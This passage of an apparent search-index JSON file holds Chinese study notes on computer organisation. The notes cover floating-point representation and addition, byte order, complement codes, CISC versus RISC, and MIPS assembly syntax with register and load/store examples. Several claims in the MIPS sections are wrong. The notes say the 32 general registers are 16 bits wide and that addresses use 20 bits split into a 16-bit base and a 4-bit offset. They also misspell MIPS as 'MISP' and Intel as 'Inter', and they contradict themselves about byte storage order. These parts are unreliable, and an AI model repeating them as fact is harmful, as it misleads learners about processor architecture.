LR\n\u8bfb\u53d6\u6307\u4ee4--&gt;\u6307\u4ee4\u8bd1\u7801--&gt;\u83b7\u53d6\u64cd\u4f5c\u6570--&gt;\u6267\u884c\u8fd0\u7b97--&gt;\u5b58\u50a8\u7ed3\u679c--&gt;\u4fee\u6539PC--&gt;\u8bfb\u53d6\u6307\u4ee4\n</code></pre>"},{"location":"course/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%9A%84%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/#13","title":"1.3 \u8ba1\u7b97\u673a\u7684\u8fd0\u7b97","text":""},{"location":"course/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%9A%84%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/#131","title":"1.3.1 \u6d6e\u70b9\u6570\u7684\u8868\u793a\uff08\u4ee5\u5355\u7cbe\u5ea6\u6d6e\u70b9\u6570\u4e3a\u4f8b\uff09","text":"<p>float\u5728\u5185\u5b58\u4e2d\u7528\u6307\u6570\u578b\u5f0f\u8868\u793a\uff0c\u5206\u89e3\u4e3a\uff1a\u6570\u7b26\uff0c\u5c3e\u6570\uff0c\u6307\u6570\u7b26\uff0c\u6307\u6570\u56db\u90e8\u5206\u3002</p> <p>\u6570\u7b26\u5360 1 \u4f4d\u4e8c\u8fdb\u5236\uff0c\u8868\u793a\u6570\u7684\u6b63\u8d1f\u3002</p> <p>\u6307\u6570\u53608\u4f4d\u4e8c\u8fdb\u5236\uff0c\u8868\u793a\u6307\u6570\u5927\u5c0f\uff0c\u5176\u4e2d\u8fd8\u5305\u62ec\u6307\u6570\u4e3a\u7684\u6b63\u8d1f\u3002\u4e00\u822c\u8fd9\u91cc\u7684\u6307\u6570\u662f\u4ee52\u4e3a\u5e95\u6570\u7684\u6307\u6570\u3002</p> <p>\u5c3e\u6570\u536023\u4f4d\uff0c\u8868\u793a\u6d6e\u70b9\u6570\u6709\u6548\u6570\u5b57\uff0c0.xxxxxxx, \u4f46\u4e0d\u5b58\u5f00\u5934\u7684 0 \u548c\u70b9\u3002</p> <p>\u6ce8\u610f\uff0c\u6d6e\u70b9\u6570\u6709\u81ea\u5df1\u7684\u4f7f\u7528\u89c4\u8303\uff0c\u5c3e\u6570\u6c38\u8fdc\u65e0\u6cd5\u6ea2\u51fa\u5230\u6307\u6570\u3002</p>"},{"location":"course/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%9A%84%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/#132","title":"1.3.2 \u6d6e\u70b9\u6570\u7684\u8ba1\u7b97","text":"<ol> <li>\u8fd0\u7b97\u89c4\u5219\uff1a</li> </ol> <p>\\({x\\pm y=(M_x*2^{E_x-E_y} \\pm M_y*2^{E_y})} (E_x \\leq E_y)\\)</p> <ol> <li> <p>\u5177\u4f53\u6b65\u9aa4\uff1a</p> </li> <li> <p>0\u64cd\u4f5c\u6570\u68c0\u67e5\uff1a\u5982\u679c\u6709\u64cd\u4f5c\u6570\u4e3a0\uff0c\u76f4\u63a5\u8fd4\u56de\u7ed3\u679c\uff0c\u8282\u7701\u65f6\u95f4\u3002</p> </li> <li> <p>\u6bd4\u8f83\u6307\u6570\u5927\u5c0f\uff0c\u6307\u6570\u5bf9\u9f50\uff1a</p> <ul> <li>\\({\\Delta E = 0}\\),\u8868\u793a\u6307\u6570\u5bf9\u9f50\uff1b\\({\\Delta E \\neq 0}\\),\u8868\u793a\u6307\u6570\u672a\u5bf9\u9f50\uff1b</li> <li>\u5982\u679c\u672a\u5bf9\u9f50\uff0c\u5219\u6307\u6570\u5c0f\u7684\u64cd\u4f5c\u6570\u5c3e\u6570\u4e3a\u5411\u53f3\u4f4d\u79fb\uff0c\u6bcf\u4e00\u52a8\u4e00\u4f4d\u4f4d\u6570\uff0c\u6307\u6570\u52a0\u4e00\uff0c\u77e5\u9053\u4f7f\u4e24\u6307\u6570\u76f8\u7b49\u4e3a\u6b62\u3002</li> </ul> </li> <li> <p>\u4f4d\u6570\u6c42\u548c\u8fd0\u7b97\uff1a\u6307\u6570\u5bf9\u9f50\u540e\u5c31\u53ef\u4ee5\u76f4\u63a5\u5bf9\u5c3e\u6570\u8fdb\u884c\u8fd0\u7b97\uff0c\u8fd0\u7b97\u89c4\u5219\u548c\u6574\u6570\u8fd0\u7b97\u89c4\u5219\u4e00\u6837\u3002</p> </li> <li> <p>\u7ed3\u679c\u89c4\u8303\u5316\uff1a\u8fd0\u7b97\u7684\u7ed3\u679c\u4e5f\u6709\u53ef\u80fd\u6ea2\u51fa\uff0c\u5b83\u8868\u660e\u4f4d\u6570\u6c42\u548c\u7684\u7ed3\u679c\u7edd\u5bf9\u503c\u5927\u4e8e2\uff0c\u6b64\u65f6\u9700\u8981\u5c06\u8fd0\u7b97\u7ed3\u679c\u5411\u53f3\u79fb\u5b9e\u73b0\u89c4\u8303\u5316\u8868\u793a\u3002\u540c\u6837\u6307\u6570\u52a0\u4e00\u3002</p> <p>\u200b     \u820d\u5165\u5904\u7406\uff1a\u5728\u89c4\u8303\u5316\u7684\u8fc7\u7a0b\u4e2d\u4f4e\u4f4d\u4f1a\u88ab\u820d\u5f03\uff0c\u4ece\u800c\u4ea7\u751f\u4e00\u5b9a\u7684\u8bef\u5dee\uff0c\u56e0\u6b64\u9700\u8fdb\u884c\u820d\u5165\u5904\u7406\u3002\u820d\u5165\u5904\u7406\u6709\u4e24\u79cd\u65b9\u5f0f\uff1a</p> <ul> <li>0\u820d1\u8fdb\uff1a\u53f3\u79fb\u662f\u65f6\u88ab\u4e22\u5f03\u7684\u6700\u9ad8\u6570\u4f4d\u4e3a0\uff0c\u5219\u76f4\u63a5\u820d\u6389\uff1b\u4e3a1\u5219\u5c06\u5c3e\u6570\u672b\u5c3e\u52a0\u4e00\u3002</li> <li>\u6052\u7f6e1\u6cd5\uff1a\u53ea\u8981\u6570\u4f4d\u88ab\u79fb\u6389\uff0c\u5c31\u5f80\u5c3e\u6570\u52a0\u4e00\u3002</li> </ul> </li> <li> <p>\u6ea2\u51fa\u5904\u7406</p> <p>\u5bf9\u4e8e\u5c3e\u6570\u7684\u6ea2\u51fa\u53ea\u9700\u8981\u5411\u6307\u6570\u8fdb\u884c\u8fdb\u4f4d\u5373\u53ef\uff0c\u53ef\u5bf9\u4e8e\u6307\u6570\u7684\u6ea2\u51fa\u548b\u529e\u5462\uff1f</p> <ul> <li>\u6307\u6570\u4e0a\u6ea2\u5c31\u662f\u6307\u6570\u8d85\u8fc7\u4e86\u6700\u5927\u503c\u7684\u6b63\u6307\u6570\u503c\uff0c\u4e00\u822c\u5c06\u5176\u8ba4\u4e3a\u662f\\({+\\infty}\\)\u6216\u8005\\({-\\infty}\\)</li> <li>\u6307\u6570\u4e0b\u6ea2\u5c31\u662f\u6307\u6570\u8d85\u8fc7\u4e86\u6700\u4e0b\u503c\u7684\u8d1f\u6307\u6570\u503c\uff0c\u4e00\u822c\u5c06\u5176\u8ba4\u4e3a\u662f0\u3002</li> </ul> </li> </ol>"},{"location":"course/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%9A%84%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/#14","title":"1.4 \u8ba1\u7b97\u673a\u7cfb\u7edf\u4e2d\u6570\u636e\u7684\u5b58\u50a8","text":"<p>\u8ba1\u7b97\u673a\u5904\u7406\u7684\u6570\u636e\u901a\u5e38\u5b58\u50a8\u5728\u5b58\u50a8\u5668\u4e2d\uff0c\u5b58\u50a8\u5668\u4ee5\u5b57\u8282\u4e3a\u5355\u4f4d\u5b58\u50a8\u6570\u636e\uff0c\u56e0\u6b64\u8ba1\u7b97\u673a\u5b58\u50a8\u591a\u5b57\u8282\u6570\u636e\u65f6\uff0c\u9700\u8981\u4f7f\u7528\u8fde\u7eed\u591a\u4e2a\u5b58\u50a8\u5355\u5143\uff0c\u5e76\u4ee5\u8fd9\u4e2a\u5b58\u50a8\u5355\u5143\u7684\u6700\u4f4e\u5730\u5740\u4f5c\u4e3a\u8be5\u6570\u636e\u7684\u5730\u5740\u3002\uff08PS\uff1a\u8ba1\u7b97\u673a\u5185\u5b58\u4e2d\u6570\u636e\u5b58\u50a8\u4ece\u9ad8\u5b57\u8282\u5411\u4f4e\u5b57\u8282\u4f9d\u6b21\u5b58\u653e\uff09</p>"},{"location":"course/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%9A%84%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/#141","title":"1.4.1 \u5b58\u50a8\u5b57\u8282\u5e8f","text":"<ul> <li>\u5927\u5b57\u8282\u5e8f\uff08\u5927\u7aef\u5e8f/\u5927\u5c3e\u5e8f\uff09\uff08\u5927\u5c0f\u5c0f\u5927\uff09\uff1a\u6570\u636e\u7684\u6700\u9ad8\u4f4d\u5b57\u8282\u653e\u5728\u6700\u4f4e\u4f4d\u7684\u5b58\u50a8\u5355\u5143\u3002\u91c7\u7528\u8fd9\u79cd\u673a\u5236\u7684\u5904\u7406\u5668\u6709PowerPC\u3001SPARC\u3001Motorala\u5fae\u5904\u7406\u5668\u7cfb\u5217\u548c\u7edd\u5927\u591a\u6570RISC\uff08\u7cbe\u7b80\u6307\u4ee4\u96c6\uff09\u5904\u7406\u5668\u3002</li> <li>\u5c0f\u5b57\u8282\u5e8f\uff08\u5c0f\u7aef\u5e8f/\u5c0f\u5c3e\u5e8f\uff09\uff08\u5927\u5927\u5c0f\u5c0f\uff09\uff1a\u6570\u636e\u7684\u6700\u9ad8\u4f4d\u5b57\u8282\u653e\u5728\u6700\u9ad8\u4f4d\u7684\u5b58\u50a8\u5355\u5143\u3002\u91c7\u7528\u8fd9\u79cd\u673a\u5236\u7684\u5904\u7406\u5668\u6709Inter\u67b6\u6784\u7684CPU\uff08Inter\u3001AMD\uff09\u3002</li> </ul> \u5730\u5740 (1200) (1201) \u5927\u5b57\u8282\u5e8f 12 34 \u5c0f\u5b57\u8282\u5e8f 34 12 <p>\u5bf9\u4e8e\u4e0d\u540c\u5904\u7406\u5668\u53ef\u4ee5\u6709\u4e0d\u540c\u7684\u5b58\u50a8\u65b9\u5f0f\uff0c\u4f46\u662f\u5982\u679c\u4e24\u4e2a\u8ba1\u7b97\u673a\u9700\u8981\u8fdb\u884c\u6570\u636e\u4f20\u8f93\u662f\uff0c\u5c31\u9700\u8981\u7edf\u4e00\u4e00\u4e2a\u89c4\u8303\uff1a\u5728\u7f51\u7edc\u4f20\u8f93\u4e2d\uff0c\u6211\u4eec\u5e38\u7528\u5927\u5b57\u8282\u5e8f\u3002</p> <p>\u5927\u5c0f\u7aef\u5404\u81ea\u7684\u4f18\u70b9</p> <ul> <li> <p>\u5927\u7aef\uff1a\u7b26\u53f7\u4f4d\u5728\u6240\u8868\u793a\u7684\u5185\u5b58\u7684\u4f4e\u5730\u5740\uff0c\u7528\u4e8e\u5feb\u901f\u5224\u65ad\u6570\u636e\u7684\u6b63\u8d1f\u548c\u5927\u5c0f</p> </li> <li> <p>\u5c0f\u7aef\uff1aCPU\u505a\u6570\u503c\u8fd0\u7b97\u7684\u65f6\u5019\u662f\u4ece\u5185\u5b58\u4e2d\u4f9d\u6b21\u4ece\u4f4e\u4f4d\u5230\u9ad8\u4f4d\u53d6\u6570\u636e\u8fdb\u884c\u8fd0\u7b97\uff0c\u8fd9\u6837\u8fd0\u7b97\u6548\u7387\u66f4\u9ad8\u3002</p> </li> </ul>"},{"location":"course/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%9A%84%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/#142","title":"1.4.2 \u6570\u636e\u7684\u8868\u73b0\u5f62\u5f0f\uff08\u673a\u5668\u6570\uff09","text":"<ul> <li>\u539f\u7801</li> </ul> <p>\u539f\u7801\u4e0e\u771f\u503c\u7684\u5bf9\u5e94\u5173\u7cfb\u6700\u76f4\u63a5\uff0c\u7b26\u53f7\u4f4d0\u2013&gt;\u975e\u8d1f\uff0c1\u2013&gt;\u8d1f\uff1b\u539f\u7801\u7684\u6570\u503c\u4e3a\u662f\u771f\u503c\u7684\u7edd\u5bf9\u503c\u3002</p> <ul> <li>\u53cd\u7801</li> </ul> <p>\u6b63\u6570\u7684\u53cd\u7801\u7b49\u4e8e\u539f\u7801\uff0c\u8d1f\u6570\u7684\u53cd\u7801\u5c31\u662f\u6570\u503c\u4e3a\u5168\u90e8\u53d6\u53cd\u30020\u7684\u53cd\u7801\u4f9d\u7136\u662f0</p> <ul> <li>\u8865\u7801</li> </ul> <p>\u6b63\u6570\u7684\u8865\u7801\u7b49\u4e8e\u539f\u7801\uff0c\u8d1f\u6570\u7684\u8865\u7801\u5c31\u662f\u8d1f\u6570\u7684\u53cd\u7801\u52a0\u4e0a1\uff08\u4e5f\u53ef\u4ee5\u7406\u89e3\u4e3a\u51fa\u7b26\u53f7\u4f4d\u548c\u6700\u540e\u4e00\u4f4d1\u5916\u5168\u90e8\u53d6\u53cd\uff09\u30020\u7684\u8865\u7801 \u662f0</p> <ul> <li>\u79fb\u7801</li> </ul> <p>\u79fb\u7801\u662f\u8865\u7801\u7684\u7b26\u53f7\u4e3a\u53d6\u53cd\u3002\u4e3b\u8981\u7528\u6765\u6309\u4f4d\u6bd4\u8f83\u4e24\u4e2a\u6570\u7684\u5927\u5c0f\u3002</p> <ol> <li>\u539f\u7801\u7684\u8868\u793a\u8303\u56f4\u662f[ $-2^{n-1}+1 $  ~      $ 2^{n-1}-1$]</li> <li>\u8865\u7801\u7684\u8868\u793a\u8303\u56f4\u662f[ $-2^{n-1} $          ~      $ 2^{n-1}-1$]</li> </ol>"},{"location":"course/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%9A%84%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/#_3","title":"\u4e8c\u3001\u6c47\u7f16\u8bed\u8a00","text":""},{"location":"course/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%9A%84%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/#21","title":"2.1 \u8ba1\u7b97\u673a\u6307\u4ee4\u67b6\u6784","text":"<p>\u8ba1\u7b97\u673a\u7684\u6307\u4ee4\u901a\u5e38\u5206\u4e3a\u4e24\u4e2a\u90e8\u5206\uff1a\u64cd\u4f5c\u7801\u548c\u64cd\u4f5c\u6570\u3002\u64cd\u4f5c\u7801\u6307\u660e\u8ba1\u7b97\u673a\u6267\u884c\u4ec0\u4e48\u6837\u7684\u64cd\u4f5c\uff0c\u800c\u64cd\u4f5c\u6570\u5219\u6307\u51fa\u8be5\u64cd\u4f5c\u5904\u7406\u7684\u6570\u636e\u6216\u6570\u636e\u5b58\u653e\u7684\u5730\u5740\u3002</p> <p>\u8ba1\u7b97\u673a\u7cfb\u7edf\u80fd\u6267\u884c\u7684\u5168\u90e8\u6307\u4ee4\u6784\u6210\u4e86\u8be5\u8ba1\u7b97\u673a\u7cfb\u7edf\u7684\u6307\u4ee4\u96c6\u3002\u4e0d\u540c\u7684\u5904\u7406\u5668\u6709\u4e0d\u540c\u7684\u6307\u4ee4\u96c6\uff0c\u800c\u8fd9\u4e9b\u6307\u4ee4\u96c6\u7684\u8bbe\u8ba1\u53d1\u5c55\u4e3b\u8981\u6709\u4e24\u4e2a\u65b9\u5411\uff1a</p> <ul> <li>\u7cbe\u7b80\u6307\u4ee4\u96c6\uff08Reduced Instruction Set Computer,RISC\uff09\uff1a\u76ee\u7684\u662f\u5c3d\u53ef\u80fd\u964d\u4f4e\u6307\u4ee4\u96c6\u7684\u590d\u6742\u5ea6\uff0c\u5df2\u8fbe\u5230\u7b80\u5316\u5b9e\u73b0\u3001\u63d0\u9ad8\u6027\u80fd\u7684\u76ee\u7684\u3002\u66f4\u9002\u7528\u4e8e\u4e13\u7528\u673a\u3002\u5982MISP\u3001Motorola\u7b49\u5fae\u5904\u7406\u673a\u3002</li> <li>\u590d\u6742\u6307\u4ee4\u96c6\uff08Complex Instruction Set Computer,CISC\uff09\uff1a\u76ee\u7684\u662f\u5f3a\u5316\u6307\u4ee4\u529f\u80fd\uff0c\u5b9e\u73b0\u8f6f\u4ef6\u529f\u80fd\u6027\u786c\u4ef6\u529f\u80fd\u8f6c\u79fb\u3002\u66f4\u9002\u7528\u4e8e\u901a\u7528\u673a\uff0c\u6211\u4eec\u65e5\u5e38\u4f7f\u7528\u7684PC\u901a\u5e38\u5c31\u662f\u4f7f\u7528CISC\u67b6\u6784\u3002\u4ee5InterX86\u4e3a\u5178\u578b\u3002</li> </ul> <p>\u7279\u70b9\uff1a</p> CISC RISC \u6307\u4ee4\u7cfb\u7edf\u5e9e\u5927\uff0c\u6307\u4ee4\u6570\u76ee\u4e00\u822c\u591a\u8fbe200\u591a\u6761 \u7cbe\u7b80\u4e86\u6307\u4ee4\u7cfb\u7edf\uff0c\u6d41\u6c34\u7ebf\u4ee5\u53ca\u5e38\u7528\u6307\u4ee4\u5747\u53ef\u7528\u786c\u4ef6\u6267\u884c \u5bfb\u5740\u65b9\u5f0f\u591a\u3001\u4ee3\u7801\u957f\u5ea6\u4e0d\u56fa\u5b9a \u6240\u6709\u6307\u4ee4\u957f\u5ea6\u5747\u76f8\u540c \u8bbf\u95ee\u5b58\u50a8\u5668\u6307\u4ee4\u4e0d\u52a0\u9650\u5236 \u53ea\u6709<code>load</code>\u548c<code>store</code>\u53ef\u4ee5\u8bbf\u95ee\u5b58\u50a8\u5668\uff0c\u5176\u4ed6\u64cd\u4f5c\u5747\u5728\u5bc4\u5b58\u5668\u4e2d\u6267\u884c \u5404\u6307\u4ee4\u6267\u884c\u65f6\u95f4\u76f8\u5dee\u5f88\u5927 \u6240\u6709\u6307\u4ee4\u7684\u529f\u80fd\u5355\u4e00\uff0c\u5728\u4e00\u4e2a\u673a\u5668\u5468\u671f\u5185\u5b8c\u6210"},{"location":"course/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%9A%84%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/#22-misp","title":"2.2 MISP\u6c47\u7f16\u6307\u4ee4\u4e00\u822c\u683c\u5f0f","text":"<p>[\u6807\u53f7:] \u64cd\u4f5c\u7801 [\u64cd\u4f5c\u65701\u3001\u64cd\u4f5c\u65702\u3001\u64cd\u4f5c\u65703] [#\u6ce8\u91ca] <ol> <li>\u6807\u53f7\uff1a\u8868\u793a\u6307\u4ee4\u5728\u5b58\u50a8\u5668\u4e2d\u7684\u5b58\u50a8\u5730\u5740\uff0c\u53ef\u9009\u9879;</li> <li>\u64cd\u4f5c\u7801\uff1a\u8868\u793a\u8fdb\u884c\u7684\u64cd\u4f5c\u7c7b\u578b\uff1b</li> <li>\u64cd\u4f5c\u6570\uff1a\u8868\u793a\u64cd\u4f5c\u7684\u5bf9\u8c61\uff08\u6570\u636e\u6216\u5730\u5740\uff09\uff0c\u53ef\u67090~3\u4e2a\uff1b</li> <li>\u6ce8\u91ca\uff1a\u4f17\u6240\u5468\u77e5\u3002</li> </ol> <p>example\uff1a<code>add a,b,c #\u5c06b+c\u7684\u7ed3\u679c\u653e\u5728a\u4e2d</code></p>"},{"location":"course/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%9A%84%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/#23","title":"2.3 \u5bc4\u5b58\u5668\u53ca\u5176\u5206\u7c7b","text":"<p>MISP\u4e2d\u670932\u4e2a\u901a\u7528\u5bc4\u5b58\u5668\uff0c\u90fd\u662f16\u4f4d\u7684</p> \u7f16\u53f7 \u540d\u79f0 \u4f7f\u7528\u89c4\u5219 $0 $zero \u5e38\u65700 $1 $at \u6c47\u7f16\u7a0b\u5e8f\u4e34\u65f6\u5b58\u50a8\u8d85\u51fa16\u4f4d\u7684\u6570\u636e $2\u3001$3 $v1\u3001$v2 \u51fd\u6570\u8fd4\u56de\u503c $4~$7 $a0~$a3 \u51fd\u6570\u8f93\u5165\u53c2\u6570 $8~$15 $t0~$t7 \u4e34\u65f6\u5bc4\u5b58\u5668 $16~$23 $s0~$s7 \u5b58\u50a8\u5bc4\u5b58\u5668\uff0c\u53d8\u91cf\u6216\u8005\u5b58\u50a8\u5355\u5143\u7684\u8d77\u59cb\u5730\u5740\uff08\u57fa\u5730\u5740\uff09 $24\u3001$25 $t8\u3001$t9 \u4e34\u65f6\u5bc4\u5b58\u5668 $26\u3001$27 $k0\u3001$k1 \u7cfb\u7edf\u4fdd\u7559\u6307\u9488 $28 $gp \u5168\u5c40\u6307\u9488 $29 $sp \u5806\u6808\u6307\u9488 $30 $fp \u5e27\u6307\u9488 $31 $ra \u51fd\u6570\u8c03\u7528\u8fd4\u56de\u5730\u5740 <p>example\uff1a</p> <p>c:<code>e = (a+b)-(c-d);</code></p> <p>MISP:</p> <pre><code>#$s0    $s1     $s2     $s3     $s4\n#a      b       c       d       e\nadd $t1,$s0,$s1\nadd $t2,$s2,$s3\nsub $s4,$t1,$t2\n</code></pre>"},{"location":"course/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%9A%84%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/#24","title":"2.4 \u5b58\u50a8\u5668\u7684\u5730\u5740\u8868\u793a","text":"<p>\u5bf9\u4e8e\u590d\u6742\u7684\u3001\u5e9e\u5927\u7684\u6570\u636e\uff0c\u5bc4\u5b58\u5668\u80af\u5b9a\u662f\u65e0\u6cd5\u76f4\u63a5\u5b58\u50a8\u7684\uff0c\u90a3\u600e\u4e48\u529e\u5462\uff1f\u6211\u4eec\u53ef\u4ee5\u628a\u5b83\u5b58\u653e\u5728\u5b58\u50a8\u5668\u4e4b\u4e2d\uff0c\u7136\u540e\u4f7f\u7528\u5f15\u7528\u7684\u65b9\u5f0f\u4f7f\u7528\uff08\u4e5f\u5c31\u662f\u4fdd\u5b58\u4ed6\u7684\u5730\u5740\uff0c\u7b49\u5230\u8981\u7528\u5176\u4e2d\u7684\u5185\u5bb9\u7684\u65f6\u5019\u518d\u5c06\u5177\u4f53\u5185\u5bb9\u52a0\u8f7d\u8fdb\u5bc4\u5b58\u5668\u4e4b\u4e2d\uff09\u3002\u90a3\u8981\u5982\u4f55\u8868\u793a\u4ed6\u7684\u5730\u5740\u5462\uff1f</p> <p>\u6211\u4eec\u77e5\u9053\u73b0\u5728\u7684\u5185\u5b58\u67092GB\u7684\u30014GB\u7684\u30018GB\u7684\u751a\u81f3\u66f4\u5927\uff0c\u5982\u679c\u4f7f\u7528\u4e00\u4e2a\u5bc4\u5b58\u5668\uff0816\u4f4d\uff09\uff0c\u53ea\u53ef\u4ee5\u8bb0\u5f55\\(2^{16}\\)\u4e2a\u5730\u5740\uff0c\u4e5f\u5c31\u662f65536\u4e2a\u5730\u5740\uff0c\u8fd9\u5728\u5185\u5b58\u4e2d\u662f\u8fdc\u8fdc\u4e0d\u591f\u7684\uff0c\u5982\u4f55\u8868\u793a\u66f4\u591a\u7684\u5730\u5740\uff0c\u8fd9\u65f6\u5019\u6211\u4eec\u5c31\u53ef\u4ee5\u7ed916\u4f4d\u7684\u6570\u636e\u540e\u9762\u5728\u9644\u52a0\u51e0\u4f4d\uff0c\u8ba9\u4ed6\u8868\u793a\u7684\u8303\u56f4\u66f4\u5927\u3002</p> <p>MISP\u7684\u5904\u7406\u65b9\u5f0f\u5c31\u662f\u5728\u5185\u5b58\u4e2d\u7684\u5730\u5740\u4e00\u5171\u4f7f\u752820\u4f4d\u8868\u793a\uff0c\u524d\u5341\u516d\u4f4d\u4f4d\u57fa\u5730\u5740\uff0c\u4e5f\u5c31\u662f\u5176\u5b9e\u5730\u5740\uff1b\u540e\u56db\u4f4d\u8868\u793a\u504f\u79fb\u5730\u5740\u3002</p> <p>\u5f53\u7136\u8fd9\u6837\u5bf9\u4e8e\u4e00\u4e9b\u5927\u7684\u5185\u5b58\u8fd8\u662f\u65e0\u6cd5\u8868\u793a\uff0c\u8fd9\u5c31\u662f\u4e3a\u4ec0\u4e48\u5904\u7406\u5668\u4f1a\u6709\u5185\u5b58\u7684\u6700\u5927\u9650\u5236\u7684\u539f\u56e0\u3002</p> <p>\u4ed6\u7a76\u7adf\u662f\u5982\u4f55\u4f7f\u7528\u7684\u5462\uff1f\u4e5f\u8bb8\u76f4\u63a5\u5c06\u7406\u8bba\u7ed9\u4f60\u4f60\u770b\u4e0d\u660e\u767d\uff0c\u90a3\u5c31\u4e3e\u4e2a\u4f8b\u5b50\u5427\uff01</p> <p>example\uff1a\u5df2\u77e5\u6570\u7ec4\u5b58\u50a8\u7684\u8d77\u59cb\u5730\u5740A\uff0c\u6570\u7ec4\u6bcf\u4e2a\u5143\u7d20\u5360\u7528m\u4e2a\u5b57\u8282\uff0c\u90a3\u4e48\u5143\u7d20A[n]\u7684\u5b58\u50a8\u5730\u5740\u4f4d\\(A+n \\times m\\),n\u4ece0\u5f00\u59cb\u8ba1\u6570\uff08\u6709\u6ca1\u6709\u4e00\u79cd\u5f88\u719f\u6089\u7684\u611f\u89c9\uff09\u3002</p> <p>MISP\u4e2d\u5982\u4f55\u8868\u793aA[n]\u7684\u5730\u5740\u5185\uff1f\u5904\u7406\u5668\u5c06A\u7684\u8d77\u59cb\u5730\u5740\u4fdd\u5b58\u5728\u5bc4\u5b58\u5668\uff08\u57fa\u5740\u5bc4\u5b58\u5668\uff09\u4e2d\uff0c\u7136\u540e\u5c06\\(m \\times n\\)\u7684\u7ed3\u679c\u8ba1\u7b97\u51fa\u6765\u4f5c\u4e3a\u5e38\u6570\uff08Imm,immediate\uff09\uff0c\u91c7\u7528<code>Imm($Rs)</code>\u7684\u65b9\u5f0f\u8868\u793a\u3002</p> <p>\u5f53\u4e00\u4e2a\u6570\u636e\uff08\u7ec4\uff09\u5360\u7528\u591a\u4e2a\u5355\u5143\u65f6\uff0c\u901a\u5e38\u4e3a\u4e86\u63d0\u9ad8\u5fae\u5904\u7406\u673a\u7684\u6267\u884c\u6548\u7387\uff0c\u91c7\u7528\u5b57\u8282\u8fb9\u754c\u5bf9\u9f50\u7684\u65b9\u5f0f\u5b58\u50a8\u6570\u636e\u3002\u4e5f\u5c31\u662f\u5b58\u50a8\u7684\u6570\u636e\u7684\u8d77\u59cb\u4f4d\u7f6e\u5fc5\u987b\u662f\u8be5\u6570\u636e\u7684\u5927\u5c0f\u7684\u6574\u6570\u500d\uff0c\u6bd4\u5982<code>int</code>\u5c31\u5fc5\u987b\u4ee54\u7684\u500d\u6570\u4f4d\u8d77\u59cb\u4f4d\u7f6e\u3002\u5f53\u7136\uff0c\u8fd9\u4e5f\u662f\u53ef\u4ee5\u8c03\u6574\u7684\uff0c\u6bd4\u5982c\u8bed\u8a00\u4e2d\u7684<code>#pragma pack(2)</code>\u5c31\u53ef\u4ee5\u4f7f\u6240\u6709\u6570\u7ec4\u653e\u57282\u7684\u6574\u6570\u500d\u4e0a\u3002\u4f46\u662f\u8fd9\u6837\u4f1a\u4e00\u5b9a\u7a0b\u5ea6\u4e0a\u964d\u4f4e\u5fae\u5904\u7406\u673a\u7684\u6267\u884c\u6548\u7387\uff0c\u6b63\u6240\u8c13\u727a\u7272\u65f6\u95f4\u8282\u7701\u7a7a\u95f4\u561b\uff01</p>"},{"location":"course/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%9A%84%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/#25","title":"2.5 \u7acb\u5373\u6570\uff08\u5e38\u6570\uff09","text":"<p>\u76f4\u63a5\u5199\u5728\u6c47\u7f16\u8bed\u8a00\u4e2d\uff0c\u4e0d\u5360\u7528\u5bc4\u5b58\u5668\u7a7a\u95f4\uff0c\u53ef\u76f4\u63a5\u4f7f\u7528\uff0c\u548c\u6307\u4ee4\u7ed1\u5728\u4e00\u8d77\u7f16\u7801\uff0c\u6210\u4e3a\u6307\u4ee4\u7684\u4e00\u90e8\u5206\u3002\u53ef\u4ee5\u52a0\u5feb\u6267\u884c\u6548\u7387\u3002</p> <p>\u6bd4\u5982</p> <pre><code>#$s2\u5b58\u50a8\u7684\u662fint\u6570\u7ec4A\u7684\u57fa\u5730\u5740\nlw $t0,0($s2) #\u4ece\u5b58\u50a8\u5668\u4e2d\u53d6\u51faA[0]\u7684\u6570\u636e\u653e\u5728$t0\u4e2d\nlw $t1,32($s2) #\u4ece\u5b58\u50a8\u5668\u4e2d\u53d6\u51faA[8]\u7684\u6570\u636e\u653e\u5728$t1\u4e2d\nsw $t1,0($s2) #\u5c06$t1\u4e2d\u7684\u6570\u636e\u5199\u5165\u5b58\u50a8\u5668\u4e2d\u7684A[0]\nsw $t0,32($s2) #\u5c06$t0\u4e2d\u7684\u6570\u636e\u5199\u5165\u5b58\u50a8\u5668\u4e2d\u7684A[8]\n#\u4ee5\u4e0a\u64cd\u4f5c\u53ef\u4ee5\u5b9e\u73b0A[0]\u548cA[8]\u7684\u6570\u636e\u4ea4\u6362\u3002\n</code></pre>"},{"location":"course/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%9A%84%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/#26-misp","title":"2.6 